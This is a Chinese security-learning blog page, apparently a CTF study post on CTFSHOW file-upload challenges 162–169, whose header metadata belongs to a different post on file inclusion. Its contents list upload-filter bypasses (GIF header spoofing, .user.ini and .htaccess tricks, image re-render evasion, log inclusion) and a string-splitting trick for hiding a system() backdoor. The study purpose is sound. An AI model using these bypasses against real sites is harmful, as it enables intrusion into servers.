@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Web学习32 | f4k3r&#39;s blog</title>
+  <meta name="keywords" content=" Web ">
+  <meta name="description" content="Web学习32 | f4k3r&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="知识点1、解释-什么是文件包含2、分类-本地LFI&amp;远程RFI3、利用-配合上传&amp;日志&amp;会话4、利用-伪协议&amp;编码&amp;算法等 核心知识：1、本地包含LFI&amp;远程包含RFI-区别一个只能包含本地，一个可以远程加载具体形成原因由代码和环境配置文件决定2、各类脚本语言包含代码写法-见下文 &lt;!–#include file&#x3D;”1.asp” –&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web学习42">
+<meta property="og:url" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/index.html">
+<meta property="og:site_name" content="f4k3r&#39;s blog">
+<meta property="og:description" content="知识点1、解释-什么是文件包含2、分类-本地LFI&amp;远程RFI3、利用-配合上传&amp;日志&amp;会话4、利用-伪协议&amp;编码&amp;算法等 核心知识：1、本地包含LFI&amp;远程包含RFI-区别一个只能包含本地，一个可以远程加载具体形成原因由代码和环境配置文件决定2、各类脚本语言包含代码写法-见下文 &lt;!–#include file&#x3D;”1.asp” –&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702152929332.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702153005415.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702153024263.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702153138095.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702153450286.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702154425730.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702154921479.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702155218911.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702155016105.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702155525039.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702161024683.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702181258730.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702181337239.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702181909524.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702182009488.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702182152005.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702182551273.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702182615687.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702195342609.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702203119330.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702204506852.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702204629938.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702204935053.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702211147669.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702211545999.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702212621928.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702213357053.png">
+<meta property="og:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702213414382.png">
+<meta property="article:published_time" content="2024-07-02T05:29:55.000Z">
+<meta property="article:modified_time" content="2024-07-02T13:34:15.897Z">
+<meta property="article:author" content="f4k3r">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/07/02/Web%E5%AD%A6%E4%B9%A042/image-20240702152929332.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>f4k3r</span>
+</div>
+
+<div class="icon">
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(52)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        <a 
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="52">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.blog.st4rr.top/">St4rr</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>服务器</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>随想</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>java</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Web</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>WP</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 "
+           href="/2024/07/02/Web%E5%AD%A6%E4%B9%A042/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习42">Web学习42</span>
+            <span class="post-date" title="2024-07-02 13:29:55">2024/07/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/07/01/Web%E5%AD%A6%E4%B9%A041/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习41">Web学习41</span>
+            <span class="post-date" title="2024-07-01 17:16:35">2024/07/01</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/30/Web%E5%AD%A6%E4%B9%A040/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习40">Web学习40</span>
+            <span class="post-date" title="2024-06-30 15:18:47">2024/06/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/29/Web%E5%AD%A6%E4%B9%A039/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习39">Web学习39</span>
+            <span class="post-date" title="2024-06-29 13:52:31">2024/06/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/28/Web%E5%AD%A6%E4%B9%A038/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习38">Web学习38</span>
+            <span class="post-date" title="2024-06-28 16:48:11">2024/06/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/27/Web%E5%AD%A6%E4%B9%A037/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习37">Web学习37</span>
+            <span class="post-date" title="2024-06-27 14:01:45">2024/06/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/26/Web%E5%AD%A6%E4%B9%A036/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习36">Web学习36</span>
+            <span class="post-date" title="2024-06-26 00:13:21">2024/06/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/25/Web%E5%AD%A6%E4%B9%A035/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习35">Web学习35</span>
+            <span class="post-date" title="2024-06-25 14:19:25">2024/06/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/24/Web%E5%AD%A6%E4%B9%A034/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习34">Web学习34</span>
+            <span class="post-date" title="2024-06-24 11:58:19">2024/06/24</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/23/Web%E5%AD%A6%E4%B9%A033/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习33">Web学习33</span>
+            <span class="post-date" title="2024-06-23 12:31:12">2024/06/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习32">Web学习32</span>
+            <span class="post-date" title="2024-06-22 00:33:22">2024/06/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/21/Web%E5%AD%A6%E4%B9%A031/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习31">Web学习31</span>
+            <span class="post-date" title="2024-06-21 11:46:42">2024/06/21</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/19/Web%E5%AD%A6%E4%B9%A030/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习30">Web学习30</span>
+            <span class="post-date" title="2024-06-19 19:00:16">2024/06/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/19/Web%E5%AD%A6%E4%B9%A029/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习29">Web学习29</span>
+            <span class="post-date" title="2024-06-19 12:06:31">2024/06/19</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/18/NSSCTF%E5%B9%B3%E5%8F%B0%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="NSSCTF平台刷题日记">NSSCTF平台刷题日记</span>
+            <span class="post-date" title="2024-06-18 15:09:22">2024/06/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/18/Web%E5%AD%A6%E4%B9%A028/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习28">Web学习28</span>
+            <span class="post-date" title="2024-06-18 11:31:15">2024/06/18</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/17/Web%E5%AD%A6%E4%B9%A027/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习27">Web学习27</span>
+            <span class="post-date" title="2024-06-17 11:36:01">2024/06/17</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/15/Web%E5%AD%A6%E4%B9%A026/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习26">Web学习26</span>
+            <span class="post-date" title="2024-06-15 19:45:59">2024/06/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/15/Web%E5%AD%A6%E4%B9%A025/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习25">Web学习25</span>
+            <span class="post-date" title="2024-06-15 13:00:46">2024/06/15</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/14/Web%E5%AD%A6%E4%B9%A024/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习24">Web学习24</span>
+            <span class="post-date" title="2024-06-14 11:24:45">2024/06/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/13/Web%E5%AD%A6%E4%B9%A023/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习23">Web学习23</span>
+            <span class="post-date" title="2024-06-13 12:01:34">2024/06/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/13/Web%E5%AD%A6%E4%B9%A022/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习22">Web学习22</span>
+            <span class="post-date" title="2024-06-13 11:58:28">2024/06/13</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/12/Web%E5%AD%A6%E4%B9%A021/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习21">Web学习21</span>
+            <span class="post-date" title="2024-06-12 13:37:15">2024/06/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/11/java%E5%AD%A6%E4%B9%A0/"
+           data-tag="java"
+           data-author="" >
+            <span class="post-title" title="java学习">java学习</span>
+            <span class="post-date" title="2024-06-11 18:46:57">2024/06/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/11/Web%E5%AD%A6%E4%B9%A020/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习20">Web学习20</span>
+            <span class="post-date" title="2024-06-11 00:24:56">2024/06/11</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/10/Web%E5%AD%A6%E4%B9%A019/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习19">Web学习19</span>
+            <span class="post-date" title="2024-06-10 00:42:13">2024/06/10</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/08/Web%E5%AD%A6%E4%B9%A018/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习18">Web学习18</span>
+            <span class="post-date" title="2024-06-08 21:20:44">2024/06/08</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/08/Web%E5%AD%A6%E4%B9%A017/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习17">Web学习17</span>
+            <span class="post-date" title="2024-06-08 19:16:10">2024/06/08</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/06/Web%E5%AD%A6%E4%B9%A016/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习16">Web学习16</span>
+            <span class="post-date" title="2024-06-06 18:55:59">2024/06/06</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/05/Web%E5%AD%A6%E4%B9%A015/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习15">Web学习15</span>
+            <span class="post-date" title="2024-06-05 15:56:07">2024/06/05</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/04/Web%E5%AD%A6%E4%B9%A014/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习14">Web学习14</span>
+            <span class="post-date" title="2024-06-04 14:04:03">2024/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/04/Web%E5%AD%A6%E4%B9%A013/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习13">Web学习13</span>
+            <span class="post-date" title="2024-06-04 12:16:20">2024/06/04</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/02/Web%E5%AD%A6%E4%B9%A012/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习12">Web学习12</span>
+            <span class="post-date" title="2024-06-02 18:38:10">2024/06/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/06/02/LitCTF2024-WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="LitCTF2024_WP">LitCTF2024_WP</span>
+            <span class="post-date" title="2024-06-02 12:18:25">2024/06/02</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/30/LitCTF2023_WP/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="LitCTF2023_WP">LitCTF2023_WP</span>
+            <span class="post-date" title="2024-05-30 17:33:08">2024/05/30</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/29/Web%E5%AD%A6%E4%B9%A011/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习11">Web学习11</span>
+            <span class="post-date" title="2024-05-29 20:24:16">2024/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/29/Web%E5%AD%A6%E4%B9%A010/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习10">Web学习10</span>
+            <span class="post-date" title="2024-05-29 18:34:51">2024/05/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/28/Web%E5%AD%A6%E4%B9%A09/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习9">Web学习9</span>
+            <span class="post-date" title="2024-05-28 17:22:39">2024/05/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/28/Web%E5%AD%A6%E4%B9%A08/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习8">Web学习8</span>
+            <span class="post-date" title="2024-05-28 10:48:57">2024/05/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/27/Web%E5%AD%A6%E4%B9%A07/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习7">Web学习7</span>
+            <span class="post-date" title="2024-05-27 16:27:52">2024/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/27/%E5%85%B3%E4%BA%8EWindows%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E4%B9%8B%E9%97%AE/"
+           data-tag="Web,服务器"
+           data-author="" >
+            <span class="post-title" title="关于Windows服务器无法远程桌面连接之问">关于Windows服务器无法远程桌面连接之问</span>
+            <span class="post-date" title="2024-05-27 16:24:10">2024/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/26/Web%E5%AD%A6%E4%B9%A06/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习6">Web学习6</span>
+            <span class="post-date" title="2024-05-26 18:36:19">2024/05/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/26/Web%E5%AD%A6%E4%B9%A05/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习5">Web学习5</span>
+            <span class="post-date" title="2024-05-26 13:10:51">2024/05/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/25/Web%E5%AD%A6%E4%B9%A04/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习4">Web学习4</span>
+            <span class="post-date" title="2024-05-25 16:12:43">2024/05/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/23/Web%E5%AD%A6%E4%B9%A03/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习3">Web学习3</span>
+            <span class="post-date" title="2024-05-23 19:38:49">2024/05/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/23/Web%E5%AD%A6%E4%B9%A02/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习2">Web学习2</span>
+            <span class="post-date" title="2024-05-23 12:34:18">2024/05/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习1">Web学习1</span>
+            <span class="post-date" title="2024-05-22 20:44:54">2024/05/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/29/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"
+           data-tag="Web,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux操作系统学习">Linux操作系统学习</span>
+            <span class="post-date" title="2024-04-29 15:35:19">2024/04/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/28/%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%94%B6%E8%97%8F/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="绕过姿势收藏">绕过姿势收藏</span>
+            <span class="post-date" title="2024-04-28 19:55:29">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/23/XYCTF-WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="XYCTF_WP">XYCTF_WP</span>
+            <span class="post-date" title="2024-04-23 12:54:05">2024/04/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/14/faker%E7%9A%84%E5%BF%83%E9%AD%94/"
+           data-tag="随想"
+           data-author="" >
+            <span class="post-title" title="faker的心魔">faker的心魔</span>
+            <span class="post-date" title="2024-04-14 21:23:39">2024/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/03/14/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2024-03-14 19:31:21">2024/03/14</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Web学习32" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Web学习32</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">Web</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-06-22 16:34:11'>2024-06-22 00:33</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web162-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E8%BF%87%E6%BB%A4-%EF%BC%8C%E4%B8%8D%E8%83%BD%E5%86%99%E5%B8%A6%E6%9C%89%E5%90%8E%E7%BC%80%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-text">Web162 知识点：过滤.，不能写带有后缀的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web163-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%88%A0%E9%99%A4-%E5%88%A9%E7%94%A8user-ini%E5%8C%85%E5%90%AB%E8%BF%9C%E7%A8%8B-%E6%95%B0%E5%AD%97%E5%9F%9F%E5%90%8D"><span class="toc-text">Web163 知识点：突破上传删除&amp;利用user.ini包含远程&amp;数字域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web164-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9Apng%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-text">Web164 知识点：png二次渲染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web165-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9Ajpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-text">Web165 知识点：jpg二次渲染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web166-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E7%BC%80"><span class="toc-text">Web166 知识点：文件名后缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web167-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9Ahtaccess%E8%A7%A3%E6%9E%90"><span class="toc-text">Web167 知识点：htaccess解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web168-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8-%E5%8F%98%E9%87%8F%E6%8B%86%E5%88%86%E7%BB%95%E8%BF%87-a-%E2%80%99syste%E2%80%99-%E2%80%99m%E2%80%99"><span class="toc-text">Web168 知识点：免杀后门&amp;变量拆分绕过$a&#x3D;’syste’.’m’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web169-%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-text">Web169 知识点：日志包含</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、文件上传-二次渲染（重要）<br>2、文件上传-简单免杀变异<br>3、文件上传-.htaccess妙用<br>4、文件上传-PHP语言特性</p>
+<p>详细点：<br>1、检测层面：前端、后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p>
+<p>本章课程内容：<br>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
+<p>上传地址： upload&#x2F;png<br>没上传之前一直访问 upload post:代码（利用php创建一个文件 读取flag）</p>
+<p>文件是否二次渲染的判断：<br>1、判断上传前后的文件大小及内容<br>2、判断上传后的文件返回数据包</p>
+<p>如果要图片后缀解析脚本代码，一般会利用包含漏洞或解析漏洞，还有.usr.ini&amp;htaccess</p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>CTFSHOW-文件上传-162到170关卡</p>
+<h3 id="Web162-知识点：过滤-，不能写带有后缀的文件"><a href="#Web162-知识点：过滤-，不能写带有后缀的文件" class="headerlink" title="Web162 知识点：过滤.，不能写带有后缀的文件"></a>Web162 知识点：过滤.，不能写带有后缀的文件</h3><p><img src="/2024/06/22/Web%E5%AD%A6%E4%B9%A032/image-20240622005758510.png"></p>
+<p>加了个GIF文件头’<strong>GIF89a</strong>‘就可以上传了，没加之前都不可以上传</p>
